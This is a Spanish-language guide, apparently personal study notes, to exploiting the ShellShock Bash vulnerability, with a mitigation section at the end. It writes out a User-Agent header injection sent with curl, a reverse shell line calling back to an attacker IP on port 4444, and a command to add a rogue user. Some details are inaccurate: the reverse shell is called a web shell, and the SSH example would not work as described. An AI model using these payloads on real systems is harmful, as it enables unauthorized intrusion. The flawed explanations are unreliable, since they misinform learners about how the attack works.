
-------
### Guía de Ataque **ShellShock** (CVE-2014-6271)

#### 1. **¿Qué es ShellShock?**

**ShellShock**, también conocido como la vulnerabilidad Bash (CVE-2014-6271), es una vulnerabilidad crítica descubierta en el shell Bash, uno de los intérpretes de comandos más utilizados en sistemas Unix y Linux. La falla permite a un atacante ejecutar comandos arbitrarios en el sistema afectado si Bash procesa variables de entorno maliciosas, lo que puede llevar a la toma de control total del sistema.

#### 2. **¿Por qué es relevante en ciberseguridad?**

ShellShock es una vulnerabilidad de ejecución remota de código (RCE) que afecta a versiones antiguas de Bash. Cualquier sistema que use Bash para procesar variables de entorno en scripts CGI, servidores SSH, o cualquier servicio que pase variables de entorno a Bash, es susceptible de ser explotado. Esto significa que un atacante puede ejecutar comandos arbitrarios en servidores vulnerables sin autenticación.

### 3. **Fases del ataque ShellShock**

#### a) **Enumeración**

El objetivo de la enumeración es determinar si el sistema está utilizando una versión vulnerable de Bash y si es accesible mediante servicios que pasan variables de entorno (como scripts CGI).

##### 1. **Verificar la versión de Bash**

Para verificar si un sistema es vulnerable a ShellShock, se puede revisar la versión de Bash:

bash

Copy code

`bash --version`

Las versiones de Bash anteriores a **4.3** son vulnerables a ShellShock.

##### 2. **Comprobar vulnerabilidad con un simple test**

Puedes comprobar manualmente si el sistema es vulnerable a ShellShock ejecutando el siguiente comando desde Bash:

bash

Copy code

`env x='() { :;}; echo VULNERABLE' bash -c "echo Esto es una prueba"`

Si ves la palabra "VULNERABLE" en la salida, significa que el sistema es vulnerable a ShellShock. Si solo ves "Esto es una prueba", el sistema está parcheado.

#### b) **Explotación**

La explotación de ShellShock se basa en la capacidad de inyectar comandos arbitrarios dentro de las variables de entorno, que luego serán procesadas por Bash.

##### **Metodología de explotación**:

1. **Explotación de CGI (Common Gateway Interface)** Los servidores web que utilizan scripts CGI para ejecutar Bash son particularmente vulnerables a ShellShock. Un atacante puede enviar solicitudes HTTP maliciosas al servidor para inyectar comandos en variables de entorno que luego serán procesadas por Bash.

- **Ejemplo de un ataque HTTP usando ShellShock**:
    
    Aquí se inyecta un comando malicioso dentro del encabezado HTTP `User-Agent`:
    
    bash
    
    Copy code
    
    `curl -H 'User-Agent: () { :;}; /bin/bash -c "echo VULNERABLE"' http://<objetivo>/cgi-bin/vulnerable_script.cgi`
    
    Si el servidor es vulnerable, el comando `echo VULNERABLE` será ejecutado por el sistema y la respuesta del servidor mostrará la palabra "VULNERABLE".
    

2. **Explotación en SSH** Si un servidor utiliza Bash como el shell predeterminado para los usuarios que inician sesión por SSH, es posible que sea vulnerable si se permite el acceso remoto no restringido.

Un atacante podría inyectar comandos maliciosos a través de variables de entorno SSH:

- **Ejemplo de ataque a través de SSH**:
    
    Si se tiene acceso a una cuenta SSH con credenciales débiles o comprometidas, el atacante podría ejecutar el siguiente comando:
    
    bash
    
    Copy code
    
    `ssh usuario@servidor.com '() { :;}; /bin/bash -c "comando_malicioso"'`
    

3. **Comandos comunes durante la explotación**:
    
    Una vez que se ha explotado la vulnerabilidad ShellShock, un atacante podría ejecutar una variedad de comandos maliciosos, como:
    
    - **Instalar una web shell** para obtener acceso persistente al sistema:
        
        bash
        
        Copy code
        
        `/bin/bash -i >& /dev/tcp/<IP-atacante>/4444 0>&1`
        
        Esto crea una shell reversa que conecta al atacante.
        
    - **Crear o modificar usuarios**:
        
        bash
        
        Copy code
        
        `/usr/sbin/useradd -m nuevo_usuario`
        
    - **Escalar privilegios** si el usuario comprometido tiene privilegios elevados.
        

#### c) **Post-explotación**

Una vez que se ha explotado ShellShock, las siguientes acciones son posibles:

1. **Obtención de acceso persistente**: Después de ejecutar comandos iniciales, un atacante puede intentar obtener acceso persistente al sistema comprometiendo servicios adicionales, como instalar backdoors o agregar usuarios maliciosos.
    
2. **Escalamiento de privilegios**: El atacante puede intentar escalar privilegios para obtener el control total del sistema, aprovechando vulnerabilidades adicionales o configuraciones incorrectas.
    
3. **Exfiltración de datos**: Tras obtener acceso, el atacante puede buscar información sensible en el sistema, como credenciales, archivos de configuración importantes, etc.
    

#### 4. **Mitigación y protección contra ShellShock**

1. **Actualizar Bash**: La solución más eficaz para prevenir el ataque ShellShock es actualizar Bash a la versión más reciente. Las versiones parchadas están disponibles desde 2014.
    
    bash
    
    Copy code
    
    `sudo apt-get update && sudo apt-get install --only-upgrade bash`
    
    O bien:
    
    bash
    
    Copy code
    
    `sudo yum update bash`
    
2. **Reforzar la seguridad de CGI**:
    
    - Evitar el uso de Bash en scripts CGI.
    - Utilizar shells alternativos o escribir scripts CGI en lenguajes más seguros, como Python o Perl.
3. **Configurar las variables de entorno adecuadamente**: Limitar el uso de variables de entorno que se pasan a los subsistemas de Bash y que no deberían aceptar entrada externa.
    
4. **Desactivar funciones innecesarias en servidores**: Si no se necesita el uso de Bash como intérprete predeterminado, es recomendable usar shells alternativos o configurar el servidor para no ejecutar scripts CGI que dependen de Bash.
    
5. **Monitoreo de Logs**: Mantener una vigilancia activa sobre los registros del sistema para detectar intentos de explotación, especialmente en los servidores que ejecutan scripts CGI.
    

#### 5. **Conclusión**

ShellShock es una vulnerabilidad grave que puede permitir la ejecución remota de código en sistemas vulnerables que utilizan Bash. Aunque el problema fue solucionado con parches, muchos sistemas aún pueden estar en riesgo si no han sido actualizados. La enumeración cuidadosa y la explotación de servicios que utilizan Bash, como scripts CGI o SSH, son las principales formas de ataque. Mantener actualizado Bash y evitar el uso de scripts CGI inseguros son las mejores defensas contra esta vulnerabilidad.

------

La guia para la enumeracion de directorios sigue el siguiente parametro

![[Pasted image 20241017163327.png]]

![[Pasted image 20241017163336.png]]

Buscamos diferentes tipos de archivos en el directorio encontrado:

![[Pasted image 20241017163446.png]]

Y de la siguiente manera podrias realizar una inyeccion de comandos:

![[Pasted image 20241017163914.png]]

Comando para ganar acceso a la maquina:

![[Pasted image 20241017164044.png]]

El siguiente script tiene automatizado este proceso:

![[Pasted image 20241017164458.png]]

